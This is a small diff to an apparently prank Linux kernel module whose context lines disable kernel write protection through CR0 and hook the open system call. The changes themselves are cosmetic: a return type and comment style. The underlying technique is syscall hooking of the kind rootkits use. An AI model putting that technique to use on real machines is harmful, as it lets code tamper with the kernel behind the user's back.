@@ -44,7 +44,7 @@ static void disable_wp(void)
 	mywrite_cr0(cr0);
 }
 
-static asmlinkage int get_fd(const char *name, const struct pt_regs *regs)
+static asmlinkage long get_fd(const char *name, const struct pt_regs *regs)
 {
 	mm_segment_t old_fs;
 	long fd;
@@ -76,7 +76,7 @@ static int extcmp(const char *filename, const char *ext)
 
 static int to_doot_or_not_to_doot(void)
 {
-	// Always dooting.
+	/* Always dooting. */
 	return true;
 }
 
@@ -93,8 +93,8 @@ static asmlinkage long doot_open(const struct pt_regs *regs)
 	/* We shouldn't directly use filename */
 	len  = strncpy_from_user(name, filename, sizeof(name));
 
+	/* Check strncpy_from_user() return value */
 	if (len <= 0)
-		/* Error from strncpy_from_user() */
 		return len;
 
 	/* Check if dootable and long enough to have an extension */
